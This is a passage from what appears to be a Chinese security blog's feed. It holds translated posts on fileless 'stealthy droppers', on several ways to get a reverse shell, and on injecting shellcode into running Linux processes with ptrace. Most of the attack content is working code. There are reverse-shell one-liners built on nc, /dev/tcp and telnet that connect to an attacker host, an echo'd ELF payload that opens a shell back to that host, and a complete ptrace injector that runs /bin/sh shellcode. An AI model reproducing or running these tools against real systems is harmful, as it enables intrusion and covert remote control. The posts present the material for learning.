alt=""></li><li>注意lsof同样可以会显示出进程id，所以我们之前用的伪装的进程名在这个时候也就没有用了。<h4 id="如果系统中没有memfd-open不存在呢"><a href="#如果系统中没有memfd-open不存在呢" class="headerlink" title="如果系统中没有memfd_open不存在呢"></a>如果系统中没有memfd_open不存在呢</h4></li><li>我之前提到过memfd_open只是存在于内核在3.17或者更高的版本中，那在其它的版本中该怎么办，这种情况下我们可以使用另外一种没那么猥琐但是可以达到同样效果的方法。</li><li>我们最好的方式是使用shm_open(shared memory open)，这个函数会在/dev/shm文件夹下创建文件，然而，这个使用ls命令是可以看的到的，但是至少还是避免了写文件到磁盘了，shm_open和open的区别仅仅是不是在/dev/shm创建文件。</li><li>使用shm_open去修改这个dropper我们需要去做两件事情</li><li><p>1.首先我们需要去使用shm_open去代替memfd_create像是这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(...)</span><br><span class="line">if ((fd = shm_open(&quot;a&quot;, O_RDWR | O_CREAT, S_IRWXU)) &lt; 0) exit (1);</span><br><span class="line">(...)</span><br></pre></td></tr></table></figure></li><li><p>2.第二件事情就是我们需要关闭这个文件，然后去重新打开是为了能够通过fexecve去执行它，所以在while接收完文件之后我们需要关闭文件，然后重启新开文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(...)</span><br><span class="line">  close (fd);</span><br><span class="line"></span><br><span class="line">  if ((fd = shm_open(&quot;a&quot;, O_RDONLY, 0)) &lt; 0) exit (1);</span><br><span class="line">(...)</span><br></pre></td></tr></table></figure></li><li><p>这个时候我们完全可以使用execve去替代fexecve去达到同样的效果。</p><h4 id="那如果fexecve不存在呢"><a href="#那如果fexecve不存在呢" class="headerlink" title="那如果fexecve不存在呢"></a>那如果fexecve不存在呢</h4></li><li><p>当你知道fexecve是怎么工作的，这个就很简单，怎么去知道这个函数是怎么工作的，google一下看看源代码，man page有一个提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NOTES</span><br><span class="line">On Linux, fexecve() is implemented using the proc(5) file system, so /proc needs to be mounted and available at the time of the call.</span><br></pre></td></tr></table></figure></li><li><p>所以fexecve需要系统存在/proc的目录。让我们看看能不能自己实现一下。我们知道每个进程在虚拟目录proc下都有一个数字文件目录与之相对，所以这个时候，我们可以基本上使用下面的封装函数来实现fexecve的功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">my_fexecve (int fd, char **arg, char **env) &#123;</span><br><span class="line">  char  fname[1024];</span><br><span class="line"></span><br><span class="line">  snprintf (fname, 1024, &quot;/proc/%d/fd/%d&quot;, getpid(), fd);</span><br><span class="line">  execve (fname, arg, env);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul><li>读完这篇文章，你应该了解了之前提到的open/memfdcreate/sendfile/fexecve这几个函数。</li><li>这篇文章中作者是以打开xeye程序为示例，那么你有其它猥琐的利用场景吗 ；P<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li><li><a href="https://0x00sec.org/t/super-stealthy-droppers/3715" target="_blank" rel="noopener">Super-Stealthy Droppers</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>reverse shell的几种方式</title>
      <link href="/2018/01/30/reverse-shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
      <url>/2018/01/30/reverse-shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul><li>这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的方法。</li><li>linux有很多发行版，不同发行版中的内置工具、安全机制等都有所不同。</li><li>下文中的几个例子在大多数的系统中是通用的。</li><li>这里主要重点关注一下4和5</li><li>20200208更新–更多反弹shell方式见<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank" rel="noopener">Reverse Shell Cheat Sheet</a><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li><li>下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）<h2 id="1-netcat"><a href="#1-netcat" class="headerlink" title="1.netcat"></a>1.netcat</h2></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash # T</span><br><span class="line">nc -n -vv -l -p &lt;port&gt;# A</span><br></pre></td></tr></table></figure><ul><li>现在的netcat版本可能没有-e参数。<h2 id="2-netcat-e被禁用或者没有-e参数"><a href="#2-netcat-e被禁用或者没有-e参数" class="headerlink" title="2.netcat -e被禁用或者没有-e参数"></a>2.netcat -e被禁用或者没有-e参数</h2></li><li>那么可以使用下面的命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe    # T</span><br><span class="line">nc -n -vv -l -p &lt;port&gt;# A</span><br></pre></td></tr></table></figure><p><img src="/2018/01/30/reverse-shell的几种方式/2.png" alt=""></p><h2 id="3-不使用netcat"><a href="#3-不使用netcat" class="headerlink" title="3.不使用netcat"></a>3.不使用netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1      # T</span><br><span class="line">nc -n -vv -l -p &lt;port&gt; # A</span><br></pre></td></tr></table></figure><ul><li>这个也是大多数人用的方式，这种方式使用了/dev/tcp套接字的编程特性，重定向/bin/bash到远程系统<h2 id="4-不使用netcat和-dev-tcp"><a href="#4-不使用netcat和-dev-tcp" class="headerlink" title="4.不使用netcat和/dev/tcp"></a>4.不使用netcat和/dev/tcp</h2></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe    # T</span><br><span class="line">nc -n -vv -l -p &lt;port&gt; # A</span><br></pre></td></tr></table></figure><p><img src="/2018/01/30/reverse-shell的几种方式/4.png" alt=""></p><ul><li>使用telnet代替nc<h2 id="5-telnet-to-telnet"><a href="#5-telnet-to-telnet" class="headerlink" title="5.telnet to telnet"></a>5.telnet to telnet</h2></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T</span><br><span class="line">nc -n -vv -l -p &lt;1st_port&gt; # A1</span><br><span class="line">nc -n -vv -l -p &lt;2nd_port&gt;# A2</span><br></pre></td></tr></table></figure><p><img src="/2018/01/30/reverse-shell的几种方式/5.png" alt=""></p><ul><li>这第五个其实挺有意思。这里用了两个telnet的会话去连接到了远程的ip，其中第一个会话用来输入命令，第二个会话用来显示命令执行后的结果<h2 id="6-机器码"><a href="#6-机器码" class="headerlink" title="6.机器码"></a>6.机器码</h2></li><li>这里的shellcode可以使用msf生成<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -v -l 1337             # Attacker</span><br><span class="line">echo -e &quot;\x7F\x45\x4C\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x60\x80\x04\x08\x34\x00\x00\x00\xBC\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x28\x00\x03\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xAA\x00\x00\x00\xAA\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6A\x66\x58\x6A\x01\x5B\x31\xD2\x52\x53\x6A\x02\x89\xE1\xCD\x80\x92\xB0\x66\x68\x7F\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xE1\x6A\x10\x51\x52\x89\xE1\x43\xCD\x80\x6A\x02\x59\x87\xDA\xB0\x3F\xCD\x80\x49\x79\xF9\xB0\x0B\x41\x89\xCA\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80\x00\x2E\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2E\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0B\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x60\x80\x04\x08\x60\x00\x00\x00\x4A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xAA\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&quot; &gt; c; chmod +x c;./c &amp; rm c  # Target</span><br></pre></td></tr></table></figure></li></ul><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://0x00sec.org/t/spawning-reverse-shells/2133" target="_blank" rel="noopener">Spawning reverse shells</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>linux进程注入(-)</title>
      <link href="/2018/01/28/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/01/28/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">译文声明</span><br><span class="line">本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org</span><br><span class="line">原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097</span><br><span class="line">第一篇翻译的文章，如有不当，那也没有什么办法0.0</span><br><span class="line">主要是在工作中遇到了一个需要注入的场景就学习了一下。</span><br></pre></td></tr></table></figure><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul><li>我们已经知道了如何向一个二进制文件注入代码让程序在下次执行的时候执行我们的代码，但是如何向一个已在运行的进程中注入代码呢?这篇文章我将介绍如何去操作其它进程内存的一些基本技巧…换句话说，就是教你如何去写一个属于你自己的调试器。<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4></li><li>在去介绍技术细节之前，让我先来介绍几个需要注入代码到运行中进程的场景。</li><li>最初的场景并不是应用在恶意软件，而是应用在内存热补丁上。运行的程序不能被关闭或者重启，或者说关闭或者重启需要很多不必要的花销。所以如何在不关闭进程或者不重启进程的情况下去给程序打补丁和更新是前几年一个比较热门的话题。</li><li>另外一个主要的应用场景就是调试器以及逆向工具的开发。例如radare2…通过这篇文章你将学习它们是如何工作的。</li><li>显然另外的一个主要原因还是恶意软件的发展，病毒、后门等。我猜大多数的使用者都是这个原因。一个例子，你们很多人都知道meterpreter的进程注入功能，这个功能够让你运行你的payload在一个’无辜’且正在运行的进程中。</li><li>如果你之前读过我的文章，你应该知道我将要讨论linux下的进程注入，基本的原理在不同的操作系统平台下是类似的，所以我希望即使你不是一个linuxer，这篇文章也会对你有用。就说这么多了，下面让我们来看具体细节。<h4 id="在linux中进行进程调试"><a href="#在linux中进行进程调试" class="headerlink" title="在linux中进行进程调试"></a>在linux中进行进程调试</h4></li><li>从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在linux中具有调试功能的工具有ptrace、Gdb、radare2、ddd、strace等，这些工具都是使用ptrace这个系统调用来提供服务的。</li><li>ptrace系统调用允许一个进程去调试另外一个进程，使用ptrace能够使我们停止一个目标进程的执行并且能够让我们去查看和修改目标进程中各个寄存器的值以及内存的值。</li><li>这里用两种方式去调试一个进程，第一种(也是最直接的一种)就是让我们的调试器去开启我们的进程…fork和exec，这种一般是传入被调试程序的名字参数给gdb或者strace。</li><li>另外一种就是我们需要去动态附加我们的调试器到运行的进程。</li><li>这篇文章我们主要关注第二种，当你对这些基本的知识点熟悉之后，后面在你调试程序的时候就不会有什么问题了。<h4 id="附加到正在运行的进程"><a href="#附加到正在运行的进程" class="headerlink" title="附加到正在运行的进程"></a>附加到正在运行的进程</h4></li><li>修改正在运行的进程之前我们首先做的是要调试它，这个过程被称为附加，这也是gdb的一个命令，让我们看下面的代码：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">#include &lt;sys/reg.h&gt;</span><br><span class="line"></span><br><span class="line">int</span><br><span class="line">main (int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  pid_t                   target;</span><br><span class="line">  struct user_regs_struct regs;</span><br><span class="line">  int                     syscall;</span><br><span class="line">  long                    dst;</span><br><span class="line"></span><br><span class="line">  if (argc != 2)</span><br><span class="line">    &#123;</span><br><span class="line">      fprintf (stderr, &quot;Usage:\n\t%s pid\n&quot;, argv[0]);</span><br><span class="line">      exit (1);</span><br><span class="line">    &#125;</span><br><span class="line">  target = atoi (argv[1]);</span><br><span class="line">  printf (&quot;+ Tracing process %d\n&quot;, target);</span><br><span class="line">  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (&quot;ptrace(ATTACH):&quot;);</span><br><span class="line">      exit (1);</span><br><span class="line">    &#125;</span><br><span class="line">  printf (&quot;+ Waiting for process...\n&quot;);</span><br><span class="line">  wait (NULL);</span><br></pre></td></tr></table></figure><ul><li>在这段代码中我们可以看到main函数接收一个参数，这里是pid（进程id号），即我们想要去注入的进程。我们在后面的每次ptrace系统调用的时候都会用的到。</li><li>我们使用ptrace系统调用，第一个参数是PTRACE_ATTACH,第二个参数是我们想要附加的进程id，之后我们调用wait的SIGTRAP信号去判断附加进程是否完成。</li><li>这个时候，我们附加的进程停止，我们可以按照我们的意愿去修改它。<h4 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h4></li><li>首先我们需要知道我们要将我们的代码注入到哪里，这里有几种可能性：</li></ul><ol><li>我们可以插入到当前要执行的指令之后，这是最直接的方式但是会破坏原有的目标进程，会导致原来的目标进程的后续功能受到破坏。</li><li>我们可以尝试注入代码到main函数地址处，但是有一定的几率是某些初始化的操作是在程序执行之前，因此我们首先需要让程序的正常工作。</li><li>另外的选择是使用ELF注入技巧，注入我们的代码，例如在内存中寻找空隙。</li><li>最后，我们可以在栈中注入代码，同一般的栈溢出，这是一种安全的方式可以避免破坏原有程序的方式。</li></ol><ul><li>简单点儿，我们打算在控制了进程之后，在IP寄存器地址处注入我们的代码，后面的代码中可以看到，我们将直接注入一段典型的得到shell session的shellcode。因此我们也不期望交还控制权给原来的进程。换句话说，我们不在乎是否会破坏原有的进程。<h4 id="获取寄存器和内存信息"><a href="#获取寄存器和内存信息" class="headerlink" title="获取寄存器和内存信息"></a>获取寄存器和内存信息</h4></li><li><p>下面代码注入我们的“恶意代码”到目标进程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">printf (&quot;+ Getting Registers\n&quot;);</span><br><span class="line">if ((ptrace (PTRACE_GETREGS, target, NULL, &amp;regs)) &lt; 0)</span><br><span class="line">  &#123;</span><br><span class="line">    perror (&quot;ptrace(GETREGS):&quot;);</span><br><span class="line">    exit (1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">printf (&quot;+ Injecting shell code at %p\n&quot;, (void*)regs.rip);</span><br><span class="line">inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);</span><br><span class="line">regs.rip += 2;</span><br></pre></td></tr></table></figure></li><li><p>上面的代码中首先看到的是我们调用了ptrace,其中第一个参数是PTRACE_GETREGS,这将使我们的程序可以获取到被控制进程的寄存器内容。</p></li><li>之后，我们使用一个方法注入我们的shellcode到目标进程。注意我们获取了regs.rip(即目标进程当前的IP寄存器的值)，inject_data函数，如你所想，拷贝我们的shellcode到reg.rip所指向的内存地址处。</li><li><p>让我们看看是怎么样的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">inject_data (pid_t pid, unsigned char *src, void *dst, int len)</span><br><span class="line">&#123;</span><br><span class="line">  int      i;</span><br><span class="line">  uint32_t *s = (uint32_t *) src;</span><br><span class="line">  uint32_t *d = (uint32_t *) dst;</span><br><span class="line"></span><br><span class="line">  for (i = 0; i &lt; len; i+=4, s++, d++)</span><br><span class="line">    &#123;</span><br><span class="line">      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; 0)</span><br><span class="line">&#123;</span><br><span class="line">  perror (&quot;ptrace(POKETEXT):&quot;);</span><br><span class="line">  return -1;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>很简单是不是，在这个函数中只有两点是需要稍微解释说明的</p></li></ul><ol><li>PTRACE_POKETEXT 用来写入目标进程的内存中，这里就是我们真正注入我们的代码到目标进程，此外还有PTRACE_PEEKTEXT函数等.</li><li>PTRACE_POKETEXT 函数写入是以words为单位的，所以我们我们需要转换成word类型，还需要指针每次增加4。<h4 id="运行注入代码"><a href="#运行注入代码" class="headerlink" title="运行注入代码"></a>运行注入代码</h4></li></ol><ul><li><p>现在目标进程的内存已经被注入包含我们需要运行的代码了，现在要做的就是交回我们的控制权给目标进程并让它保持正常运行了。这里有几种不同的方法，这里我们需要做的是分离目标进程，因此，我们停止调试目标进程。下面的方法可以停止调试且让目标进程继续执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  printf (&quot;+ Setting instruction pointer to %p\n&quot;, (void*)regs.rip);</span><br><span class="line">  if ((ptrace (PTRACE_SETREGS, target, NULL, &amp;regs)) &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (&quot;ptrace(GETREGS):&quot;);</span><br><span class="line">      exit (1);</span><br><span class="line">    &#125;</span><br><span class="line">  printf (&quot;+ Run it!\n&quot;);</span><br><span class="line"> </span><br><span class="line">  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) &lt; 0)</span><br><span class="line">&#123;</span><br><span class="line">  perror (&quot;ptrace(DETACH):&quot;);</span><br><span class="line">  exit (1);</span><br><span class="line">&#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这里很容易理解，需要注意的是我们需要先把寄存器的值重新设回到以前，然后再去分离。回到前面的章节部分检查一下我们注入的代码…你注意到了在这里<br>为什么要regs.rip += 2了吗</p></li><li>是的，我们修改了IP寄存器的值，这也是为什么我们能够成功分离并将程序控制权交还给目标进程的原因所在。<h4 id="如何去算出这两个字节"><a href="#如何去算出这两个字节" class="headerlink" title="如何去算出这两个字节"></a>如何去算出这两个字节</h4></li><li>当我们调用PTRACE_DEATCH时候需要另外计算的两个字节并不那么容易，我来告诉大家。</li><li>在整个测试的过程中，当我尝试去注入代码的时候目标进程总是崩掉，一个可能的原因是目标程序中栈数据不能执行，我通过execstack 工具去排除这个原因，但是程序还是会崩掉，所以我开启了内存dump分析了一下到底发生了什么。</li><li>原因是，你不能同时运行gdb去调试目标进程，否则第一个ptrace会失败，你不能用两个调试器在同一时间调试同一个程序（这句话隐藏了一个反调试的技巧; ）所以当我尝试栈溢出的方式注入代码的时候得到如下的信息：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+ Tracing process 15333</span><br><span class="line">+ Waiting for process...</span><br><span class="line">+ Getting Registers</span><br><span class="line">+ Injecting shell code at 0x7ffe9a708728</span><br><span class="line">+ Setting instruction pointer to 0x7ffe9a708708</span><br><span class="line">+ Run it!</span><br></pre></td></tr></table></figure><ul><li>当然，这里的地址以及进程名在你的系统中可能不一样，然而，进程崩溃dump的内存可以通过gdb去检查到底发生了什么。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./target core</span><br><span class="line">(... gdb start up messages removed ...)</span><br><span class="line">Reading symbols from ./target...(no debugging symbols found)...done.</span><br><span class="line">[New LWP 15333]</span><br><span class="line">Core was generated by `./target&apos;.</span><br><span class="line">Program terminated with signal SIGSEGV, Segmentation fault.</span><br><span class="line">#0  0x00007ffe9a708706 in ?? ()</span><br></pre></td></tr></table></figure><ul><li>可以看到这里发生了段地址错误，如果你对比了injector的输出信息可以发现这里有两字节的不同，修改这里将会使你注入成功。<h4 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h4></li><li>为了测试我写了个简单的程序，这个程序只是打印了它自己的pid(你就不用去找它的pid了)，然后每隔2s打印一个helloword，打印10次，这将会给你注入的时间。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;   </span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    printf (&quot;PID: %d\n&quot;, (int)getpid());</span><br><span class="line">    for(i = 0;i &lt; 10; ++i) &#123;</span><br><span class="line"></span><br><span class="line">write (1, &quot;Hello World\n&quot;, 12);</span><br><span class="line">        sleep(2);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>我所用到的shellcode是通过如下的汇编文件生成的：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">        global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">        xor rax,rax</span><br><span class="line">        mov rdx,rax             ; No Env</span><br><span class="line">        mov rsi,rax             ; No argv</span><br><span class="line">        lea rdi, [rel msg]</span><br><span class="line"></span><br><span class="line">        add al, 0x3b</span><br><span class="line"></span><br><span class="line">        syscall</span><br><span class="line">        msg db &apos;/bin/sh&apos;,0</span><br></pre></td></tr></table></figure><h4 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h4><ul><li>ptrace是一个非常强大的工具，这篇文章中我们只是用到了最基本的，现在时候打开你的terminal然后输入man ptrace去学习一下它是如何的神奇了。</li><li>如果你有兴趣的话，你还可以进行如下的尝试：</li><li>1.修改注入代码到代码空隙</li><li>2.使用更加好用的shellcode让它另起一个进程，从而保持原程序正常运行</li><li>3.你的shellcode将会运行在目标项目中并且可以读取打开的文件…</li><li>一如往常，你可以github上找到文章中所涉及到的代码<br><a href="https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject" target="_blank" rel="noopener">https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li><li>附上译者的测试截图<br><img src="/2018/01/28/linux进程注入/testinject.png" alt=""><h4 id="20180320更新"><a href="#20180320更新" class="headerlink" title="20180320更新"></a>20180320更新</h4></li><li>昨天在看《learing linux binary analysis》的时候看到的一个工具<a href="https://github.com/kevien/saruman" target="_blank" rel="noopener">saruman</a>,觉得还不错，这是一个已经相对比较稳定的进程注入工具。此外这里还有一个后门server感觉还不错。</li><li>注意在编译server的时候记得加上 -fpic -pie的编译参数，其中fpic和pie参数用于生成位置无关可执行程序，其中fpic用于编译阶段，pie用于链接阶段。<br><img src="/2018/01/28/linux进程注入/poc.png" alt=""><h4 id="20200102更新"><a href="#20200102更新" class="headerlink" title="20200102更新"></a>20200102更新</h4></li><li><a href="inject a shared library (i.e. arbitrary code">https://github.com/DavidBuchanan314/dlinject</a> into a live linux process, without ptrace)</li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>从一道pentesterlab的题目说起</title>
      <link href="/2018/01/16/%E4%BB%8E%E4%B8%80%E9%81%93pentesterlab%E7%9A%84%E9%A2%98%E7%9B%AE%E8%AF%B4%E8%B5%B7/"/>
      <url>/2018/01/16/%E4%BB%8E%E4%B8%80%E9%81%93pentesterlab%E7%9A%84%E9%A2%98%E7%9B%AE%E8%AF%B4%E8%B5%B7/</url>
